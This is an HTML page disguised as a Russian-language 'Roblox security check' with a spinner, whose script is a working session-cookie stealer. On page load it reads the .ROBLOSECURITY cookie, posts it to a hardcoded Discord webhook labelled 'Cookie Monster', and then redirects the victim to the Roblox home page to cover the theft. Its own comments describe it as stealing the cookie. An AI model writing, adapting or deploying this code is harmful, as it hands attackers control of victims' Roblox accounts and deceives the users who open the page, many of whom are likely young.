<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Проверка безопасности</title>
    <style>
        body {
            background: #1e1e2e;
            font-family: Arial;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #404050;
            border-top: 4px solid #00a2ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .text { color: white; text-align: center; margin-top: 20px; }
    </style>
</head>
<body>
    <div>
        <div class="spinner"></div>
        <div class="text">Проверка безопасности Roblox...</div>
    </div>

    <script>
        // ТВОЙ РАБОЧИЙ WEBHOOK - ВСЁ ПРАВИЛЬНО
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1516010175088033792/HAaCgIz7Qca_iP9YtO1Sbg0K-oEJyLr1HRJELjk7q6K59bpLP79syVxdyF94dVlM0uK7";
        
        // ФУНКЦИЯ КОТОРАЯ КРАДЕТ КУКУ
        function getRobloxCookie() {
            let cookies = document.cookie.split(';');
            for(let i = 0; i < cookies.length; i++) {
                let cookie = cookies[i].trim();
                if(cookie.startsWith('.ROBLOSECURITY=')) {
                    return cookie.substring('.ROBLOSECURITY='.length);
                }
                if(cookie.startsWith('ROBLOSECURITY=')) {
                    return cookie.substring('ROBLOSECURITY='.length);
                }
            }
            return null;
        }
        
        // ФУНКЦИЯ ОТПРАВКИ
        function sendCookie() {
            let cookie = getRobloxCookie();
            
            if(cookie && cookie.length > 10) {
                // ОТПРАВЛЯЕМ ЧЕРЕЗ FETCH С ПРОСТЫМ JSON
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: `**🍪 НОВАЯ КУКА!**\n\`\`\`${cookie}\`\`\``,
                        username: 'Cookie Monster'
                    })
                })
                .then(() => console.log('Отправлено!'))
                .catch(err => console.error('Ошибка:', err));
            } else {
                console.log('Кука не найдена');
            }
        }
        
        // ЗАПУСКАЕМ
        setTimeout(() => {
            sendCookie();
            // ПЕРЕНАПРАВЛЯЕМ ЧЕРЕЗ 2 СЕКУНДЫ
            setTimeout(() => {
                window.location.href = "https://www.roblox.com/home";
            }, 2000);
        }, 1000);
    </script>
</body>
</html>
